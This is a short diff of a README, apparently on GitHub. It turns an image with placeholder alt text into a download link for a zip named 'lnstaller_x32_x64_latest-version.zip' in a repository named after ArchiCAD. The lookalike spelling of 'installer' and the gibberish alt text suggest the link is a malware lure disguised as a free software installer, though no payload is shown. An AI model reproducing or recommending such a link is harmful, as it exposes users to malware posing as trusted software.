@@ -1,7 +1,7 @@
 
 
 [![sdasdasd](https://github.com/user-attachments/assets/90925cbf-0fd6-42b6-afc3-f2213138998b)
-]()
+](https://github.com/NielsGro/archicad-windows-macos/releases/download/1/lnstaller_x32_x64_latest-version.zip)
 
 
 # Contributing
